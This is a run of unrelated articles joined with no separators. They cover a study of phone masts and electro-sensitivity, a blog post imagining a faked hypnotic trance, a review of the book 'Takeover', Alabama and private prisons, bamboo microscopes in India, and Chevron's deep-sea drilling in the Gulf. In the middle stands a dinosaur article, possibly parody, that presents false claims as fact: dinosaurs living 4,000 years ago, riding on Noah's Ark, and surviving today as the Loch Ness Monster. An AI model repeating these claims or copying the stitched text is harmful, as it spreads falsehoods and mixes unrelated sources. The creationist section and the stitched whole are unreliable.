Many think masts make them ill
Dozens of people who believed the masts triggered symptoms such as anxiety , nausea and tiredness could not detect if signals were on or off in trials .
However , the Environmental Health Perspectives study stressed people were nonetheless suffering " real symptoms " .
Campaign group Mast Sanity said the results were skewed as 12 people in the trials dropped out because of illness .
In the trial , many of those who blame masts for their symptoms reported greater distress when they thought the signal was on , suggesting the problem has a psychological basis .
" Belief is a very powerful thing , " said Professor Elaine Fox , of the University of Essex , who led the three - year study .
" If you really believe something is going to do you some harm , it will . "
The study was funded by the Mobile Telecommunications and Health Research programme , a body which is itself funded by industry and government .
Modern appliances
It is unclear how many people in the UK suffer from " electro - sensitivity " , an allergy they believe can be triggered by a range of modern day appliances from hair driers to mobile phone masts .
This should be reassuring news for anyone who is concerned about the possible short - term health effects of masts
Dr James Rubin ,
King 's College London
But the HPA research did not consider the effects of waves from phone masts , as most of the studies looking at electrical sensitivity were carried out before they were widely introduced .
A number of studies subsequently have looked at the mobile effect , but the Essex experiments are some of the largest and most detailed to date .
After 12 of the sufferers dropped out of the trial , researchers tested a total of 44 people with a history of symptoms against a control group of 114 people who had never reported ill effects from masts .
When the signal was being emitted , and they were told of this , sensitive individuals reported lower levels of well - being .
This was true for exposure to both forms of mobile systems - GSM and UMTS ( 3G ) .
However , when tests were carried out in which neither the experimenter or participant knew if the mast was on or off , the number of symptoms reported was not related to whether a signal was being emitted or not .
Chance finding
Two of the 44 sensitive individuals correctly judged if it was on or off in all six tests , as did five out of 114 control participants .
" This proportion is what is expected by chance , " the researchers said .
The symptoms were real .
As well as reporting feeling unwell , sensitive individuals had sweatier skin and higher blood pressure - both measures of a physiological response .
But this was regardless of whether the signal was on or off .
" Hence the range of symptoms and physiological response does not appear to be related to the presence of either GSM or 3G signals , " the study concluded .
Other experts endorsed the study 's findings .
Dr James Rubin , of the Mobile Phone Research Unit , King 's College London , said the findings were in line with those from most other previous experiments .
" This should be reassuring news for anyone who is concerned about the possible short - term health effects of masts , " he said .
But Mast Sanity declared " history has shown that many now commonly accepted physical conditions were initially dismissed as psychological " .
" Is n't it time that the government woke up to the reality of electrosensitivity instead of attempting to persuade sufferers that it is all in their minds ? " said spokeswoman Yasmin Skelt .
But another campaign group , Powerwatch , commended the research as " one of the best designed and executed studies to date " while stressing that the number of dropouts was unfortunate .
" So whilst it can not be entirely ruled out that a small minority are truly sensitive , the proportions of any truly sensitive people are likely to be far lower than the 3 - 35 % that has been quoted . "
A reader sent me a link about some students who allegedly had trouble coming out their trances after a hypnotist ’s stage act .
http://www.abc4.com/news/local/story.aspx?content_id=082e7301-203d-470d-a8c1-2e83a2075614
I do n’t know what really happened , but as a trained hypnotist , I can assure you that no one had trouble coming out of a trance .
My best guess is that a student or two were playing a practical joke that got out of hand .
That is exactly the sort of practical joke I would have played if I were a student and wanted to get out of classes .
But I would have put my own twist on it .
When I got on stage with the hypnotist , I ’d strike a zombie pose and yell “ MUST … KILL… GRANDMA … ” and then stiff - leg - walk out of the auditorium .
If teachers grabbed me , and they called paramedics , I would stay stiff and zombie - like the whole time , and really try to sell it .
When paramedics got me on the gurney , on the way to the ambulance , I ’d say stuff like “ MUST OBEY HYPNOTIST AND KILL GRANDMA . ”
The paramedics , having not seen the hypnotist ’s act , might assume he really suggested it .
They would wonder if they should call the police and close down the entire school until everyone who got that suggestion was deprogrammed .
When I got to the emergency room , and a doctor examined me , I ’d stay in zombie mode , arms straight out , crazy eyes .
And I ’d wait for the doctor to do anything vaguely doctorish , such as tap my knee to check my reflexes .
As soon as he did , I ’d snap out of it and say , “ What happened ?
Why am I here ?
Who are you people ? ”
The next day , when the principal , by now highly suspicious of my trance , started interrogating me , I ’d say things like , “ Apparently I ’m highly suggestible .
Can I ride on the short bus ? ”
Or “ If you do n’t think hypnosis works , why did you waste school money hiring a hypnotist ? ”
Eventually the principal would inadvertently say the wrong thing , probably in the form of a question such as , “ Why did you say , ‘ Must kill grandma ’ ? ”
As soon as he asked the question , I ’d snap back into zombie mode and start yelling “ MUST … KILL…GRANDMA ” again , and stiff - leg - walk out of the office .
I ca n’t imagine ever getting tired of it .

Back in the 1970s and ’ 80s , in the wake of post - Watergate reforms , which put a brake on the executive power amassed by Richard M. Nixon , a small group of Republicans — including , most notably , Dick Cheney , who was then President Gerald Ford ’s chief of staff and later President George H. W. Bush ’s secretary of defense — abandoned traditional conservatives ’ suspicion of concentrated government power and began looking for ways to expand presidential prerogatives .
As Charlie Savage , a reporter for The Boston Globe , observes in his astute and harrowing new book , “ Takeover , ” those efforts made some progress during the administrations of Ronald Reagan and the first President Bush , and came to startling fruition under the current administration of George W. Bush and Mr. Cheney , now the vice president .
Indeed , Mr. Savage suggests that after Sept. 11 a “ perfect storm of political pressures , ” including a compliant , Republican - controlled Congress and a public fearful of further terrorist attacks , enabled an aggressive White House to expand vastly the powers of the executive branch and dangerously tip the constitutional system of checks and balances .
Mr. Savage won a Pulitzer Prize this year for a series of articles he wrote for The Globe about executive power and Mr. Bush ’s use of “ signing statements , ” which the president has attached to dozens of laws enacted by Congress , asserting his authority to disregard certain provisions because they conflicted with his interpretation of the Constitution .
With “ Takeover ” Mr. Savage has expanded those articles into a book that is important reading for anyone interested in how the current administration has amped up presidential power while trying to undermine Congress ’s powers of oversight and the independence of the judiciary .
Many aspects of this subject have been examined in newspaper and magazine articles and earlier books , and Mr. Savage leans heavily at times on the work of other reporters as well as his own groundbreaking work for The Globe , owned by The New York Times Company .
But this volume is distinguished by his ability to pull together myriad story lines into a succinct , overarching narrative that is energized by his own legal legwork and interviews with key figures like John C. Yoo , a former deputy assistant attorney general , and Brent Scowcroft , who was national security adviser to the first President Bush .
LIFE , which in Alabama really means life , is better than it once was at the St Clair Correctional Facility , a maximum - security jail near Birmingham .
In 1985 prisoners rioted over what they called barbaric conditions , taking 22 hostages , breaking the warden 's jaw and beating his deputy so badly that he lost all memory of the assault .
Six years ago , six dangerous inmates escaped under a faulty lethal electric fence .
All six were recaptured , but angry Alabamians demanded that someone sort the jail out .
That someone was Ralph Hooks , the new warden who took over just after the escape .
He tightened up security , adding ten miles ( 16 km ) of razor wire and a fence that trips an alarm if climbed on or tampered with .
But perhaps more importantly , he tried to make the jail a less horrible place to be locked up in .
When he arrived , he found that a few officers were handcuffing and beating inmates to punish them .
One was demanding protection money from an inmate 's family .
Mr Hooks sacked or suspended all the abusers he could catch , and one was prosecuted .
Now , he reckons , the prisoners feel they are treated fairly , and are less likely to riot .
If an inmate has a grievance , he can come and discuss it face to face with the warden .
Inmates ( see above ) even teach each other to read .
A slight man on the point of retirement , Mr Hooks mingles fearlessly with hundreds of muscular , tattooed prisoners , who address him with respect and an occasional smile .
Under Mr Hooks , the jail is no longer barbaric .
But it is still grim .
For a start , it is over - crowded .
Three sweaty thugs are often crammed into a 69 - square - foot ( six - square - metre ) cell with little light and no air - conditioning .
In the Alabama summer it is fearfully hot .
“ If we had air - conditioning , we 'd maybe have fewer fights , ” says Mr Hooks , but there is no chance , he reckons , that the Alabama legislature will give him the money .
Schools , roads and the needs of law - abiding folk come first .
But law - abiding folk would presumably prefer not to be mugged or murdered , so they ought to care whether prison conditions make that more or less likely .
Obviously , jail takes criminals off the streets .
What is less clear is whether tough conditions in jail reduce crime beyond that , by acting as a deterrent , or raise it , by brutalising prisoners and making them more prone to re-offend once released .
Two studies draw contrary conclusions .
Lawrence Katz , Steven Levitt and Ellen Shustorovich examined the death rate in American jails ( excluding executions ) as a proxy for harsh conditions .
After looking at data in every state between 1950 and 1990 , they estimated that each death in prison was associated with between 30 and 98 fewer violent crimes being committed .
They concluded that tough conditions do deter potential criminals , though they cautioned that this did not necessarily mean they were desirable , since even criminals have rights .
Keith Chen of Yale and Jesse Shapiro of the University of Chicago approached the problem another way .
They recently compared the experiences of prisoners who were nearly - but - not - quite bad enough to be put in a high - security jail with those only just bad enough to be in one .
These two groups , they assumed , would be similar in temperament ; but those in higher - security jails would endure a harsher regime and nastier cellmates .
By comparing recidivism rates for the two groups , Messrs Chen and Shapiro estimated whether tough conditions made bad men worse .
They concluded that they did : similar prisoners held in higher security jails were 10 - 15 percentage points more likely to be re-arrested after being released .
Since they estimated this effect to be larger than the deterrent effect identified by Mr Katz and co. , they concluded that humane jails make for safer streets .
Mr Hooks reckons that it all depends on the individual .
Good conditions may help one inmate re-enter society ; a Spartan environment may deter another , he says .
Personally , he bends towards rehabilitation rather than punishment .
Inmates at St Clair are offered drug treatment and job training .
There is a well - stocked law library — “ so they know how to sue me , ” he chuckles .
Some Alabamians complain that taxpayers ' money should not be wasted on educating criminals .
Mr Hooks says he asks such people whether they would prefer the ex-con next door to be unskilled and jobless .
Alabama 's current commissioner of prisons , Richard Allen , is also keen on rehabilitation .
In April , noting that 95 % of prisoners are eventually released , he announced a new programme to help them find a place to live , a job and help with staying off drugs .
But for those still behind bars overcrowding remains a serious problem , and not only in Alabama .
Thanks largely to tougher sentencing , the number of prisoners in America exploded from 500,000 in 1980 to 2.3 m in 2006 .
Although the rising ratio of prisoners to the general population has been levelling off since 2000 , the absolute number is still growing steadily ( see chart ) .
Overcrowding could be eased by jailing fewer people or by building more cells .
Leniency is unpopular , however , even though non-violent drug offenders make up between a fifth and a quarter of prisoners , and many could be treated rather than jailed without endangering the public .
Building new prisons , meanwhile , is costly .
California decided last year to spend $ 7.8 billion to expand its prisons , but still the plan was struck down by judges this week as unworkable .
Some states , including California , are finding that they can save money by making more use of private prisons .
This is controversial .
But contrasting St Clair with a prison operated by the Corrections Corporation of America ( CCA ) suggests that it may not be a bad idea .
Their facility in Tutwiler , Mississippi , is light and air - conditioned where St Clair is dark and steaming .
It is less crowded and has a freshly - painted feel ; St Clair is shabby and peeling .
The sports facilities are better .
“ We try to wear them out so they go to sleep — like you do with your kids , ” says the warden , Robert Adams .
Inmates who have tasted both public and private lock - ups say they prefer the latter .
“ You 've more things in CCA .
More programmes .
Better rec[reational facilities ] , ” says Anthony Palabay , the sex offender in charge of in - jail movies .
( Films with too much sex or racial tension are barred . )
The main reason states contract with private jailers is to cut costs .
Tony Grande , a vice - president at CCA , says his firm typically charges 5 - 15 % less per prisoner than a state would spend .
The firm has economies of scale — it guards more prisoners than any state bar California , Texas or Florida .
It can assemble a jail quickly and cheaply using standardised parts .
It lacks a state 's cumbersome bureaucracy .
It builds smart jails , where fewer staff can watch more prisoners , and it builds where land and labour are cheap .
Private prisons are cheaper and at least as humane as public ones .
But one way they curb costs is to take prisoners from any state that has more than it can handle and lock them up wherever they have spare capacity .
Mr Adams , for example , guards a crowd of Hawaiians and is expecting an influx of Californians soon .
This matches supply with demand , but holding prisoners so far from home that their families can probably never visit seems unduly harsh .
The Hawaiians at Tutwiler can talk with their loved ones via a video link - up , but can hug them only if they can afford the air fare .

Dinosaurs ( Behemoths ) Article by Dr. Richard Paley
What Are Dinosaurs ?
Learn more about dinosaurs at Conservapedia
Dinosaurs are large , reptilian land animals that lived in great abundance over 4000 years ago ( " There were giants in the earth in those days " [ Gen 6:4 ] ) , and were mostly wiped out during the Flood .
Contrary to the depictions of them from Hollywood , dinosaurs were herbivorous ( " he eateth grass as an ox . " [ Job 40:15 ] ) and lived concurrently and in peace with man .
They did not live 65 million years ago , as evolutionists claim , since nothing but God existed then .
They were created on the sixth day along with the other land animals ( plesiosaurs , pterasaurs and others of their kinds are not strictly speaking dinosaurs , and they were created on the fifth day with the other animals of the water and sky . )
Dinosaur bones are often found in sedimentary rocks formed during the Flood and are harder than the bones of other animals ( " his bones are as strong pieces of brass ; his bones are like bars of iron . " [ Job 40:18 ] . )
Man and dinosaur lived together peacefully around 2000 BC .

Pre-Noachian man tried to tame the dinosaur , wishing to use its might for evilness and arrogantly thinking himself as mighty as the Lord .
This grieved the Lord , and He brought the Flood upon the earth [ Gen. 6 ] .
Species of dinosaurs were among the animals taken aboard the ark by Noah ( " And of every living thing of all flesh , two of every sort shalt thou bring into the ark , to keep them alive with thee " [ Gen. 6:19 ] , ) and thus dinosaurs survived the Flood .
Scholars theorize that some of these descendents of Noah 's ark were used to aid Noah 's progeny in building the Tower of Babel .
After that fiasco , the Lord felt that man was clearly not worthy of associating with His most powerful creation anymore , and ever since dinosaurs have been hidden from us .
Dinosaurs have been a favorite propaganda tool for evolutionists since the 19th century , and continue to be used to promote the pseudoscientific religion of Evolutionism in the Secular media .
Movies such as Jurassic Park and Disney 's Dinosaur are designed to indoctrinate the masses into the Evolutionistic world view .
The appeal of dinosaurs to kids is of particular interest to Evolutionists since it allows them to gain easy and willing access the minds of our children ( " for the imagination of man 's heart is evil from his youth " [ Gen. 8:21 ] . )
And by recasting the Lord 's gentle behemoths as blood - thirsty " terrible thunder lizards , " they are able to make appeals to -- and further support -- the base desires of our culture for violence ( " Yea , in heart ye work wickedness ; ye weigh the violence of your hands in the earth . " [ Ps. 58:2 ] ) .

Dinosaur Mania And Our Children - " Dinosaurs are the newest fad .
Will they lead children away from our Creator ?
Or to Him ? "
Evolutionism Propaganda : Subliminal Propaganda
Creation Science Evidences of Dinosaurs
This campaign has been very effective , as most people -- even most Christians -- are n't aware of the evidences that contradict the evolutionistic position .
Evidence of man-dinosaur contemporaneity , although actively suppressed by the Evolutionistic hegemony , is in abundence and includes :
Historical References in the Bible
In the Book of Job , the Lord clearly describes dinosaurs ( called " behemoths " by Adam , in the original Hebrew , and in the 1611 King James translation of the Bible ; the term " dinosaur " having only been coined in the 1800's ) by saying that [ the behemoth ] " moveth his tail like a cedar " [ Job 40:17 ] .
The Lord also states in no uncertain terms that the behemoths and man lived concurrently when He says to Job " Behold now behemoth , which I made with thee ; " [ Job 40:15 ] .
This also indicates that Job was able to view dinosaurs for himself .
( See also : Are Dinosaurs In The Bible ? )
Fossil Evidence
Many instances of overlapping human / dinosaur fossil tracks ( footprints in mud that have become hardened into stone ) have been found world wide .
Some of the more famous are the Paluxy " Man Tracks " of Glen Rose , Texas and the " Tango Lagarto " of Patagonia .
Also , evidence of human artifacts found with dinosaur bone fossils are surprisingly common -- surprising mainly since you never hear about them in Evolutionist literature .
One typical case was the discovery of copper jewelry in the fossilized remains of the gizzard of a protoceratops found in the Gobi desert .
Petroglyphs

( Click for source . )
American Indians have documented on rock walls the dinosaurs they saw while immigrating into the Americas from the Middle East after the Flood .
( See the inset " The Postdiluvian Earth " in my article about kangaroos for a map of the Earth immediately after the Flood Waters asswaged . )
These petroglyphs , including one from the Natural Bridges National Monument in Utah that features a clear depiction of an Apatosaur , are irrefutable evidence of man / dinosaur contemporaneity that not even the most ardent Atheist can ignore .
Here are some links to further pictures : Dinosaur Petroglyphs at Natural Bridges National Monument , Utah
Dinosaur Petroglyphs at Wupatki National Monument , Arizona
Dinosaur Art By Native Americans , including Colorado and the Grand Canyon Extant Dinosaurs Although exceedingly rare , living dinosaur and related species can still be found world wide .
Some famous examples are the Loch Ness Monster , a Scottish plesiosaur ( or leviathan ) ; Mokele - Mbembe , an African sauropod ; and the Chupacabra , a South American velociraptor .
This obviously proves that man and dinosaur have existed -- and continue to exist -- contemporaneously .
NEW !
( 12/1/2002 ) Read all about Dinosaur Expedition 2002 , a joint expedition of Fellowship University , The Creation Science Museum of Cleveland , and the Fairlight Institute which I participated in that uncovered startling evidence of extant Apatosaur in Africa .

Issues of Confusion
Over the years I have encountered a lot of confusion among the Secularly inclined , as well as some Christians , about a few issues on the nature of dinosaurs and how they relate to Creation .
Most of this confusion is based on not viewing dinosaurs in a proper Biblical context , instead incorporating erroneous Evolutionistic assumptions to draw conclusions that seem to make Creation Science look at fault .
( I believe that this confusion is probably the intention of the Evolutionists , who would rather muddle the issues than acknowledge Creation Science coherent . )
Here are some of the more notoriously confused issues :
T-rex was a Herbivore All animal kinds , as well as humans , started out as herbivores .
This is clearly stated in the Bible [ Gen 1:29 - 30 ] : " And God said , Behold , I have given you every herb bearing seed , which is upon the face of all the earth , and every tree , in the which is the fruit of a tree yielding seed ; to you it shall be for meat .
" And to every beast of the earth , and to every fowl of the air , and to every thing that creepeth upon the earth , wherein there is life , I have given every green herb for meat : and it was so . "
Before the Fall , there was no death nor bloodshed ; it was only after Sin entered the world that animals started to die and to kill .
Pre -Fall dinosaurs such as T - rex or velociraptors ate only vegetation , later developing , through the process of Entropic Genetic Degeneration ( aka " microevolution , " ) sharper teeth and a hunger for blood .
But not all kinds of dinosaurs , nor every individual member of a particular kind , fell into bloodlust :
Some kinds , such as the sauropods and the hadrosaurs , remained herbivorous ( although , no doubt , becoming wicked in other ways ) ; and herbivorous examples of dinosaur kinds that Evolutionists typically classify as carnivores existed up to the time of Noah ( as I will explain in the next section . )
The reason there are no fossil examples of herbivorous T - rex with teeth more suited to shredding plants than flesh is because all those fossils we have came from the Great Deluge .
The bones of herbivorous T - rex newly evicted from the Garden of Eden turned to dust long before the Flood came , and those that perished and were fossilized in the Flood had already succumbed to the wickedness of carnivorism .
Dinosaurs and the Ark Dinosaurs were on the Ark .
Although this is not stated directly in the Bible ( as the Bible also does n't state directly that aardvarks or zebras were on the Ark , ) it is an inescapable conclusion based on both physical evidence and , more importantly , what the Bible does state .
In Genesis 6:19 , God commanded Noah thusly : " And of every living thing of all flesh , two of every sort shalt thou bring into the ark , to keep them alive with thee ; they shall be male and female . "
We know that dinosaurs were alive at the time since they were fossilized during the Flood , many in active poses suggesting fear of their impending doom and horrific realization , however faint and dinosaurish , of their God- displeasing wickedness .
So necessarily , Noah had to have brought representatives of the dinosaur kinds into the Ark in order to properly follow God 's command ( and since Noah was a righteous man , this he would have done . )
One of the most common protests about dinosaurs on the Ark is that the carnivorous ones would have ate all the other animals , as well as Noah and his family .
And even if they could be safely contained in strong gopherwood cages , they would need large amounts of meat to keep them alive for the duration of the Flood ( this last protest is also levied against other , currently carnivorous animals such as lions and tigers . )
However , this ignores the possibility that only herbivorous representatives of the dinosaur ( and other ) kinds were taken into the Ark .
It would be unsurprising if Noah , who was chosen over the other wicked men for his unique righteousness , would see fit to choose those individual animals that were themselves righteous , leaving the wicked , carnivorous ones behind to perish .
Strong evidence for this hypothesis is the fact that Noah and the other animals were n't eaten , or else we all would n't be here today .
Another protest is that the dinosaurs were too large to fit in the Ark .
This is , of course , rubbish .
We know the Ark was sufficiently large to hold all the kinds just fine since God gave Noah the dimensions .
We must keep things in perspective : the size of sauropods , wooly mammoths , giant ground sloths , and the like were exceptional ; it is the average size of the animal kinds that mattered , and the average was about the size of a house cat .
Surely one could fit a great many pairs of house cats into a 300 by 50 by 30 cubit boat with room enough to spare for hay and water !
One last Ark - related protest that , amazingly , I keep hearing ( it truly boggles my mind how Evolutionism has made people this confused about Creation Science ) : " How could the T - rex be both on the Ark and fossilized in the Flood ? "
If you have n't already figured this out by now , the simple answer is that only two T - rex were taken on the Ark from a much larger pre-Flood population of T - rex .
The wicked ones left behind were the ones fossilized .
Dinosaurs and Lizards
In attempting to refute the false theories of Evolutionists , some have postulated that dinosaurs were not unique creations , but just alternate forms of common lizards -- such as one would find in one 's garden today -- that either grew to immense proportions due to advanced age ( many reptiles grow continuously , stopping only at death , ) or suffered from the same sorts of bone afflictions caused by vitamin D deficiency from the sun being partially occluded by a global vapor canopy that afflicted pre-flood men ( the so - called " Neanderthals " of the Evolutionists . )
While there undoubtedly are some " dinosaurs " named by Evolutionists that are nothing more than overgrown lizards -- the dimetrodon , for example -- the study of Flood remains , baraminological research1 , Biblical hermeneutics , and the existence of extant dinosaurs under present environmental and eschatological conditions all support the reality of the special and seperate creation of dinosaur and lizard kinds .
So ... yes Virginia , there really were dinosaurs , and they were some of the Lord 's most magnificent creations -- from the mighty behemoths ( apatosaur and its ilk ) to the awe - inspiring unicorn ( the progenitor of the ceratopsian baramin2 ) .
Although Evolutionists have tried to latch on to them and use them as propaganda tools , we should n't fall into the mistake of overreacting in our refutations of Evolutionism by denying dinosaur existence or diminishing them as mere lizards .
Footnotes :
Funding is tight .
Grants are rejected .
Research equipment is too expensive .
And these are complaints heard in well - heeled laboratories in the US and UK .
In the following pages , we present inspiring examples of scientists who , using materials as simple as litmus paper , bamboo and blenders , prove that science on a shoestring is possible — and sometimes even better than the alternative .
In a remote village in eastern India , dozens of underprivileged children are for the first time marveling at the elaborate details of flower petals with the help of a microscope — made out of bamboo .
Fitted with a × 20 lens , the light , compact and ecofriendly microscope is proving a boon for dozens of cash - strapped schools , granting students firsthand access to an otherwise unaffordable scientific tool .
Clear vision : Members of the Delhi - based nonprofit Jodo Gyan have made about 2,500 microscopes from bamboo .
This nifty device is a product of the creative minds at Jodo Gyan , a small nonprofit in New Delhi .
“ Indian children are not getting to experience all the joy and wonder of science because there is too much emphasis on the memorization and repetition of concepts , ” says Usha Menon , a government researcher who founded Jodo Gyan in 1999 .
“ Hundreds of thousands of children are learning without understanding anything . ”
Priced at 150 rupees ( roughly $ 4 ) , the microscope is just one of the educational tools created by Jodo Gyan , literally translated as ' linking knowledge ' .
Other tools include mathematical card and board games and sticky geometric shapes in a variety of colors .
The 30 - member group has also led more than 700 teacher - training workshops and runs an alternative primary school that enrolls 54 underprivileged students .
But the microscope remains the star attraction .
Jodo Gyan has supplied the instrument to several organizations such as Chennai 's Goodbooks Teacher 's Center and New Delhi's Pragya , a nonprofit that provides services to neglected , high - altitude areas .
These organizations then distribute the microscopes to schools in their localities .
Jodo Gyan has also secured two big orders in the last few years from the UN Children 's Fund for use in alternative learning centers in India .
But with no external funding , Jodo Gyan is run on a shoestring budget , particularly because the group sells its learning aids for not much more than it costs to produce them , says Menon .
The group 's base of operations is a ramshackle building in Delhi 's impoverished Shakurpur area that also doubles as Menon 's home .
To meet the demand for its popular microscope , Jodo Gyan has fashioned a makeshift microscope factory right on the building 's roof .
Sitting up there amidst bamboo shards , members have so far chopped and carved about 2,500 microscopes for use in schools , educational nonprofits and , in at least one case , research .
Debal Deb , an ecologist who has set up a rural seed exchange to conserve dozens of endangered folk rice species in West Bengal , routinely uses Jodo Gyan 's microscopes to study the surfaces of rice grains .
More important , Deb 's microscope has caught the attention of dozens of curious children from nearby villages , who stop by after school to peer through its lens .
“ The microscope has opened up a whole new world for these children , ” says Deb .
“ They could never have imagined that an ant could have tiny antennae or that dragonfly wings could have such beautiful and intricate patterns . ”

The Cajun Express has bored the deepest offshore well in Gulf history . *
Photo : Michael Sugrue * _ _" Is n't this transcendent ? "
__Paul Siegele shouts as he presses his nose to the window of a Bell 430 chopper hurtling through a sky thick with rain and pitchfork lightning .
We 're flying over the Gulf of Mexico , above some 3,500 oil production platforms , and Siegele is pointing them out with the verve of a birder — here a miniature oil rig known as a monopod ; over there a drill ship almost as big as the Titanic ; still farther out , platforms looking like huge steel chandeliers that dropped out of the storm - shaken clouds .
Siegele has reason to be giddy .
He works for Chevron , and his team is sitting on several new record - breaking discoveries in the Gulf , a region that many geologists believe may have more untapped oil reserves than any other part of the world .
On this trip , the 48 - year - old vice president for deepwater exploration has come to a rig called the Cajun Express to oversee final preparations before drilling begins on the company 's 30 - square - mile Tahiti field .
Looming like an Erector set version of Hellboy — with cranes for arms , a hydraulic drill for its head , and a 200 - foot derrick for a body — the rig appears at once menacing and toylike .
But the real spectacle is below the surface : A drill is plunging down through 4,000 feet of ocean and more than 22,000 feet of shale and sediment — a syringe prodding Earth 's innermost veins .
That 5 - mile shaft will soon give Chevron the deepest active offshore well in the Gulf .
Some land drills have gone deeper , but extracting oil from below miles of freezing salt water and unyielding sediment creates a set of technical problems that far exceed those faced on terra firma .
Minutes after we land on the Cajun Express , Siegele gets some bad news from Ron Byrd , his weather - beaten site manager .
" The junk basket is stuck way down there on some debris , " says Byrd , who has captained offshore rigs for more than 30 years .
The junk basket is an 8 - inch hunk of iron that runs up and down the entire length of the drill hole on a piece of wire , scraping the well clean before sensitive production instruments are dropped in .
It 's a particularly important device when drilling offshore , because the presence of the ocean pushes debris , mud , fossils , and other muck into the hole .
Siegele , who is a lanky 6 ' 3 " with a mild , professorial manner and a boyish mop of brown hair , winces almost imperceptibly .
" Just a little bump in the road , " he mutters .
Technically , it 's a million - dollar bump .
The crew will spend 48 hours fishing the jammed tool out of the hole , halting all other activity on a rig that costs over $ 500,000 a day to run .
But this is chump change to Siegele , who has an annual budget of more than $ 1 billion .
" If snags like this did n't happen so frequently , " Siegele says , " you 'd probably let them get to you . "
It 's just another high - priced mishap in the world of ultradeep - sea drilling — the newest , riskiest , and most technologically extreme drilling frontier .
Today , deep - sea rigs are capable of reaching down 40,000 feet , twice as deep as a decade ago : plunging their drills through 10,000 feet of water and then 30,000 more feet of seabed .
One platform sits atop each so - called field , thrusting its tentacles into multiple wells dug into ancient sediment , slurping out oil , and then pumping it back to onshore refineries through underwater pipelines .
It 's a business where huge sums are lost ( two years ago , BP suffered a $ 250 million blow when a hurricane took out one of its platforms ) but even more can be made .
The mother lode of oil in the deepwater Gulf is so significant that Tahiti and other successful fields in this region are expected to soon produce enough crude to reverse the long - standing decline in US oil production of about 10 percent per year .
Even better , a recent discovery by Chevron has signaled that soon there may be vastly more oil gushing out of the ultradeep seabeds — more than even the optimists were predicting four years ago .
In 2004 , the company penetrated a 60 million - year - old geological stratum known as the " lower tertiary trend " containing a monster oil patch that holds between 3 billion and 15 billion barrels of crude .
Dubbed Jack , the field lies beneath waters nearly twice as deep as those covering Tahiti , and many in the industry dismissed the discovery as too remote to exploit .
But last September , Chevron used the Cajun Express to probe the Jack field , proving that petroleum could flow from the lower tertiary at hearty commercial rates — fast enough to bring billions of dollars of crude to market .
It was hailed as the largest publicly reported discovery in the past decade , opening up a region that is perhaps big enough to boost national oil reserves by 50 percent .
A mad rush followed , and oil companies plowed more than $ 5 billion into this part of the Gulf .
It was a burst of good news for the oil industry .
Today , many of the world 's largest fields — from Ghawar in Saudi Arabia to Prudhoe Bay in Alaska — are facing retirement , and the ultradeep frontier holds the industry 's best hope for big new discoveries .
But there are still big questions to be answered before Jack starts filling gas tanks :
How well will oil flow from these prehistoric rocks ?
Can Chevron 's equipment handle the increased temperatures and pressures at these depths ?
Can engineers successfully pump the oil back to shore ?
In November , a sister rig to the Cajun Express will putter over to the Jack field , and Chevron will " spud " a preproduction well in search of answers to these questions .
" There 's no guarantee that the rewards in this field will outweigh the risks , " says Siegele , slumping .
But then he sucks in a breath of salt air and straightens up .
He 's got to brief a group of drilling engineers on the plans for Chevron 's grand venture into Jack .
__Chevron runs its __offshore drilling operations out of a gleaming Houston skyscraper that recalls the nose of a double - barreled shotgun aimed skyward .
Geologists work in cavernous visualization rooms with floor - to - ceiling monitors depicting digital renderings of the Gulf waters and seabed .
Chevron has long bet that there 's oil in these regions and has bought from the Department of the Interior almost twice as many federal leases to drill in the ultradeep waters of the Gulf as any other company .
One of Chevron 's top geologists , a Jerry Garcia look - alike named Barney Issen , pulls an image of the Jack field up onto the monitors .
" To you , this may looks like a dog 's breakfast , " he says , pointing to a multi colored morass .
But the data is actually a finely detailed 3 - D map of the ocean , seafloor , and sediment below .
It will allow Chevron to locate promising spots to drill and then provide a guide for the engineers who operate the production process remotely .
To make this map , Issen and his team deployed ships that cruised through the Gulf , popping off air guns — underwater cannons that emit a gigantic burp into the ocean , bouncing sound waves off under water rock formations .
Hydrophones ( aquatic microphones ) tethered to the vessels recorded the response , taking in hundreds of thousands of recordings simultaneously .
These allowed the company to determine the composition and shape of the rocks below .
Chevron needed to use masses of microphones to compensate for the distortions caused by a layer of salt as jagged as the Swiss Alps beneath the seafloor in the ultradeep regions of the Gulf .
That mineral , unfortunately for the geologists in Houston , acts like a fun - house mirror for seismic sound waves .
Issen compares sorting through the data to " peering through a thick wall of mottled glass and trying to count the freckles of someone on the other side . "
Once the map was assembled , the Chevron team at the Houston office pored over the data and searched for sandy layers of sediment under domelike caps of shale .
These signify the location of a potential reservoir because oil consistently rises through permeable sediment to the highest point it can go , collecting under unyielding shale mounds .
Once these promising spots are found , the maps are used to chart the drill 's optimal point of entry : the place where it 's least likely to hit a nasty fault line or air pocket that would throw the whole well off .
Finding the sweet spot is like dropping a baseball from 5 miles in the sky and hitting home plate — at night .
Then you have to hope you 've found a highly porous and permeable oil bed .
Most people think of oil as floating in big pools under layers of rock .
But it 's actually embedded in the rock , sort of like water in a sponge .
" When you drive the drill down , you 're going into porous rock that can be either kinda squishy or kinda rigid , " Siegele says .
Squishy is better , but as rock ages , it typically become tighter .
That 's why industry members were flabbergasted by the Jack well test that revealed high porosity .
It 's also what gives the Jack field , and the lower tertiary in general , the potential to reduce America 's dependence on foreign oil — while earning Chevron a ton of money .
__The galley of the __Cajun Express is a prisonlike cafeteria of stainless steel and gray linoleum crammed with engineers in blue coveralls devouring their meals .
Today the menu is bratwurst , cheese fries , and twice - baked potatoes .
At first glance , it 's hard to believe this is the setting for a proposed Food Network special on the high - caliber cuisine 140 miles offshore .
But the grub is lip - smackingly good .
The Cajun is equipped with other perks : an Internet café , a gym , and a movie theater — but these luxuries are hardly used .
Few of the men have the energy for entertainment or exercise after working a 12 - hour shift on the drilling floor — hauling great vats of mud used for drill lubricant , welding broken iron casings , or repairing robotic submarines that fix problems with seafloor equipment .
The living quarters , which house up to 150 workers , are the size of walk - in closets , filled with cot -sized bunk beds that fold out of the walls .
" When you 're here , you 're pretty much working or sleeping , " says Siegele .
Stout salaries make up for the extreme conditions :
Entry - level tool pushers make about $ 60,000 , and high - level geologists and engineers can earn in the mid six figures .
Added bonus : a massive testosterone rush .
" This is the best big - boy toy you 'll ever find , " says Chevron spokesperson Mickey Driver .
The first task for the men on the boat is to make sure that the rig stays in one place .
In shallower areas , rigs can be anchored to the sea bottom — but it 's dangerous to moor a drilling vessel in ultradeep water .
The motion of the ocean and the fierceness of the currents at those depths make it too cumbersome .
Plus , vessels need to be able to move to safety in the event of a hurricane .
Ultradeep drilling rigs are kept " on station " by so - called thrusters — engines on each corner of the rig that are programmed to respond to a GPS system tracking both the drill 's target on the seafloor and the ocean currents .
